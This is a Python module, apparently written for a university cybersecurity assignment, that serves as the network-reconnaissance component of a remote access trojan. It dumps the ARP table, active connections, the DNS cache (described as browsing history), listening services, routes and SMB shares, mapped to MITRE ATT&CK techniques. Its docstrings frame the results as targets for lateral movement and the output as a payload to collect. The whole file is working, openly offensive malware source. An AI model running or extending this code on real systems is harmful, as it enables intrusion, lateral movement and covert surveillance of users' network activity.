"""
Network Reconnaissance Module
MITRE ATT&CK: T1049 (System Network Connections Discovery)
                T1018 (Remote System Discovery)
                T1016 (System Network Configuration Discovery)
EDUCATIONAL PURPOSE ONLY - RMIT Cybersecurity Assignment

Maps the local network topology from the target machine:
  1. ARP table → devices on the same network segment
  2. Active TCP connections → what the machine is talking to
  3. DNS cache → recently resolved domains (browsing history without browser access)
  4. Listening services → attack surface for lateral movement
  5. Routing table → network segmentation and gateway info

Real-world usage: This is how APTs plan lateral movement.
A RAT that only exfiltrates data is a script kiddie tool.
A RAT that maps the network enables campaign-level operations.
"""

import subprocess
import re
import socket
import psutil


def get_arp_table():
    """
    Dump the ARP table to discover devices on the local network.

    ARP entries reveal:
      - Other machines on the same subnet (potential lateral movement targets)
      - The default gateway MAC (for ARP spoofing attacks)
      - Device vendors (from MAC OUI prefix)

    Returns:
        list of dicts: [{ip, mac, type, interface}]
    """
    entries = []
    try:
        result = subprocess.run(
            ["arp", "-a"],
            capture_output=True, text=True, timeout=10
        )

        # Parse ARP output: "  192.168.1.1         00-50-56-c0-00-08     dynamic"
        for line in result.stdout.split("\n"):
            match = re.search(
                r'(\d+\.\d+\.\d+\.\d+)\s+([\da-f]{2}[:-][\da-f]{2}[:-][\da-f]{2}[:-][\da-f]{2}[:-][\da-f]{2}[:-][\da-f]{2})\s+(\w+)',
                line, re.IGNORECASE
            )
            if match:
                ip, mac, entry_type = match.groups()
                entries.append({
                    "ip": ip,
                    "mac": mac.lower(),
                    "type": entry_type,
                    "vendor": _mac_to_vendor(mac),
                })

    except Exception:
        pass

    return entries


def get_active_connections():
    """
    List active TCP/UDP connections with process info.

    Active connections reveal:
      - What services the machine communicates with
      - Potential C2 channels from other malware
      - Internal services (databases, file shares, etc.)
      - Cloud services in use (AWS, Azure, GCP endpoints)

    Returns:
        list of dicts: [{local_addr, remote_addr, status, pid, process_name}]
    """
    connections = []
    try:
        for conn in psutil.net_connections(kind='inet'):
            entry = {
                "local_addr": f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else None,
                "remote_addr": f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else None,
                "status": conn.status,
                "pid": conn.pid,
                "process_name": None,
            }

            # Resolve process name
            if conn.pid:
                try:
                    proc = psutil.Process(conn.pid)
                    entry["process_name"] = proc.name()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

            # Only include established or listening connections (skip noise)
            if conn.status in ("ESTABLISHED", "LISTEN", "SYN_SENT", "CLOSE_WAIT"):
                connections.append(entry)

    except (psutil.AccessDenied, OSError):
        # Fallback: use netstat
        try:
            result = subprocess.run(
                ["netstat", "-ano"],
                capture_output=True, text=True, timeout=10
            )
            for line in result.stdout.split("\n"):
                parts = line.split()
                if len(parts) >= 5 and parts[0] in ("TCP", "UDP"):
                    connections.append({
                        "local_addr": parts[1],
                        "remote_addr": parts[2] if parts[0] == "TCP" else None,
                        "status": parts[3] if parts[0] == "TCP" else "UDP",
                        "pid": int(parts[-1]) if parts[-1].isdigit() else None,
                        "process_name": None,
                    })
        except Exception:
            pass

    return connections


def get_dns_cache():
    """
    Dump the Windows DNS resolver cache.

    The DNS cache is a goldmine — it reveals every domain the machine
    has recently resolved, which is essentially a browsing + app history
    that doesn't require browser access.

    Returns:
        list of dicts: [{name, type, record_data, ttl}]
    """
    entries = []
    try:
        result = subprocess.run(
            ["ipconfig", "/displaydns"],
            capture_output=True, text=True, timeout=15
        )

        current_name = None
        for line in result.stdout.split("\n"):
            line = line.strip()

            name_match = re.match(r"Record Name\s*[.:]+\s*(.+)", line)
            if name_match:
                current_name = name_match.group(1).strip()

            type_match = re.match(r"Record Type\s*[.:]+\s*(\d+)", line)
            record_type = None
            if type_match:
                type_num = int(type_match.group(1))
                type_map = {1: "A", 5: "CNAME", 28: "AAAA", 12: "PTR", 33: "SRV"}
                record_type = type_map.get(type_num, str(type_num))

            data_match = re.match(r"(?:A \(Host\)|AAAA|CNAME)?\s*Record\s*[.:]+\s*(.+)", line)
            if data_match and current_name:
                entries.append({
                    "name": current_name,
                    "type": record_type,
                    "record_data": data_match.group(1).strip(),
                })
                current_name = None

    except Exception:
        pass

    # Deduplicate
    seen = set()
    unique = []
    for e in entries:
        key = (e["name"], e.get("record_data", ""))
        if key not in seen:
            seen.add(key)
            unique.append(e)

    return unique


def get_listening_services():
    """
    Find services listening on ports — the local attack surface.

    Listening ports reveal:
      - Web servers, databases, remote desktop
      - Development tools (debug ports, hot-reload servers)
      - Potential pivot points for lateral movement

    Returns:
        list of dicts: [{port, protocol, pid, process_name, bind_addr}]
    """
    services = []
    try:
        for conn in psutil.net_connections(kind='inet'):
            if conn.status == "LISTEN":
                entry = {
                    "port": conn.laddr.port,
                    "bind_addr": conn.laddr.ip,
                    "protocol": "TCP",
                    "pid": conn.pid,
                    "process_name": None,
                }

                if conn.pid:
                    try:
                        proc = psutil.Process(conn.pid)
                        entry["process_name"] = proc.name()
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        pass

                # Identify well-known services
                entry["service_hint"] = _port_to_service(conn.laddr.port)
                services.append(entry)

    except (psutil.AccessDenied, OSError):
        pass

    return services


def get_routing_table():
    """
    Get the routing table to understand network segmentation.

    Returns:
        list of dicts: [{destination, mask, gateway, interface, metric}]
    """
    routes = []
    try:
        result = subprocess.run(
            ["route", "print"],
            capture_output=True, text=True, timeout=10
        )

        in_ipv4 = False
        for line in result.stdout.split("\n"):
            if "IPv4 Route Table" in line:
                in_ipv4 = True
                continue
            if "IPv6 Route Table" in line:
                break

            if in_ipv4:
                parts = line.split()
                if len(parts) >= 5:
                    try:
                        # Validate first field is an IP
                        socket.inet_aton(parts[0])
                        routes.append({
                            "destination": parts[0],
                            "mask": parts[1],
                            "gateway": parts[2],
                            "interface": parts[3],
                            "metric": parts[4] if len(parts) > 4 else "N/A",
                        })
                    except OSError:
                        continue

    except Exception:
        pass

    return routes


def get_shares():
    """
    Enumerate SMB/network shares (potential lateral movement paths).

    Returns:
        list of dicts: [{name, path, remark, type}]
    """
    shares = []
    try:
        result = subprocess.run(
            ["net", "share"],
            capture_output=True, text=True, timeout=10
        )

        lines = result.stdout.strip().split("\n")
        for line in lines[4:]:  # Skip header lines
            if line.strip() and "command completed" not in line.lower():
                parts = line.split()
                if len(parts) >= 2:
                    shares.append({
                        "name": parts[0],
                        "path": parts[1] if len(parts) > 1 else "",
                        "remark": " ".join(parts[2:]) if len(parts) > 2 else "",
                    })

    except Exception:
        pass

    return shares


def full_network_recon():
    """
    Run all network recon and return combined results.

    Returns:
        dict with all network intelligence
    """
    arp = get_arp_table()
    conns = get_active_connections()
    dns = get_dns_cache()
    services = get_listening_services()
    routes = get_routing_table()
    shares = get_shares()

    return {
        "arp_table": arp,
        "active_connections": conns[:100],  # Cap at 100 to avoid huge payloads
        "dns_cache": dns[:200],             # Cap at 200
        "listening_services": services,
        "routing_table": routes,
        "network_shares": shares,
        "summary": {
            "devices_on_network": len(arp),
            "active_connections": len(conns),
            "dns_entries": len(dns),
            "listening_ports": len(services),
            "routes": len(routes),
            "shares": len(shares),
        }
    }


def _mac_to_vendor(mac):
    """Basic MAC OUI to vendor mapping for common devices."""
    oui = mac.replace("-", ":").lower()[:8]
    vendors = {
        "00:50:56": "VMware",
        "00:0c:29": "VMware",
        "08:00:27": "VirtualBox",
        "dc:a6:32": "Raspberry Pi",
        "b8:27:eb": "Raspberry Pi",
        "00:1a:7d": "Cyber-blue",
        "44:85:00": "Intel",
        "3c:22:fb": "Apple",
        "a4:83:e7": "Apple",
        "f8:ff:c2": "Apple",
        "00:15:5d": "Hyper-V",
        "48:e7:da": "Unknown",  # Common in OUI databases
    }
    return vendors.get(oui, "Unknown")


def _port_to_service(port):
    """Map well-known ports to service names."""
    services = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 135: "RPC", 139: "NetBIOS", 143: "IMAP",
        443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S",
        1433: "MSSQL", 1521: "Oracle", 3306: "MySQL", 3389: "RDP",
        5432: "PostgreSQL", 5900: "VNC", 6379: "Redis", 8080: "HTTP-Alt",
        8443: "HTTPS-Alt", 27017: "MongoDB",
    }
    return services.get(port, "")


if __name__ == "__main__":
    print("=" * 50)
    print("  Network Reconnaissance Test")
    print("  T1049 + T1018 + T1016")
    print("=" * 50)

    # ARP
    arp = get_arp_table()
    print(f"\n[{'+'if arp else '-'}] ARP Table: {len(arp)} entries")
    for entry in arp[:10]:
        print(f"    {entry['ip']:16s} {entry['mac']:18s} {entry['type']:8s} ({entry['vendor']})")

    # Active connections
    conns = get_active_connections()
    established = [c for c in conns if c["status"] == "ESTABLISHED"]
    print(f"\n[+] Active connections: {len(conns)} total, {len(established)} established")
    for c in established[:10]:
        proc = c['process_name'] or f"PID:{c['pid']}"
        print(f"    {c['local_addr']:22s} → {c['remote_addr']:22s} [{proc}]")

    # DNS cache
    dns = get_dns_cache()
    print(f"\n[{'+'if dns else '-'}] DNS cache: {len(dns)} entries")
    for d in dns[:15]:
        print(f"    {d['name'][:50]}")

    # Listening services
    services = get_listening_services()
    print(f"\n[{'+'if services else '-'}] Listening services: {len(services)} ports")
    for s in services[:15]:
        hint = f" ({s['service_hint']})" if s['service_hint'] else ""
        proc = s['process_name'] or f"PID:{s['pid']}"
        print(f"    :{s['port']:<6d} {s['bind_addr']:16s} [{proc}]{hint}")

    # Shares
    shares = get_shares()
    print(f"\n[{'+'if shares else '-'}] Network shares: {len(shares)}")
    for s in shares:
        print(f"    {s['name']:15s} {s['path']}")
